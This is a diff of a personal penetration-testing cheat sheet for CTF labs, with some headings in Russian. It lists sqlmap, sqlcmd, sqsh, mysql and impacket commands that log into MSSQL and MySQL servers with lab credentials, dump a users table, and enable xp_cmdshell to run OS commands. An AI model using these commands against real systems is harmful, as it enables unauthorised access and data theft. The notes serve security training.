@@ -30,28 +30,29 @@ sqlmap -u 'http://10.129.237.210/dashboard.php?search=FERA' --batch --random-age
 
 # MYSQL server
 
-sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
-SELECT name FROM master.dbo.sysdatabases
-GO
-USE htbusers;
-GO
-SHOW TABLES;
-SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
-GO
-SELECT * FROM users
-go
-xp_cmdshell 'whoami'
-GO
-EXECUTE sp_configure 'show advanced options', 1
-GO
-RECONFIGURE
-GO
-EXECUTE sp_configure 'xp_cmdshell', 1
-GO
-RECONFIGURE
-GO
+    sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
+    SELECT name FROM master.dbo.sysdatabases
+    GO
+    USE htbusers;
+    GO
+    SHOW TABLES;
+    SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
+    GO
+    SELECT * FROM users
+    go
+    xp_cmdshell 'whoami'
+    GO
+    EXECUTE sp_configure 'show advanced options', 1
+    GO
+    RECONFIGURE
+    GO
+    EXECUTE sp_configure 'xp_cmdshell', 1
+    GO
+    RECONFIGURE
+    GO
 
 ********************************************************************************
+
 mysql -h 123.123.131.131 -u root -p
 
 mysql -u bolt_dba -p
@@ -89,8 +90,15 @@ mysqldump -u theseus(user) -p Magic(datab)
 
 # Подключение к БД windows microsoft sql service (MSSQL)
 
-        sqsh -S 10.129.20.13 -U username -P Password123
-
+    sqsh -S 10.129.20.13 -U username -P Password123
+    SELECT name FROM master.dbo.sysdatabases
+    GO
+    USE htbusers;
+    GO
+    SHOW TABLES;
+    SELECT * FROM users;
+    
+************************************************************
     mssqlclient.py 'reporting:PcwTWTHRwryjc$c6'@10.10.10.125 -db volume -windows-auth
 
     impacket-mssqlclient ARCHETYPE/sql_svc@10.129.21.3 -windows-auth
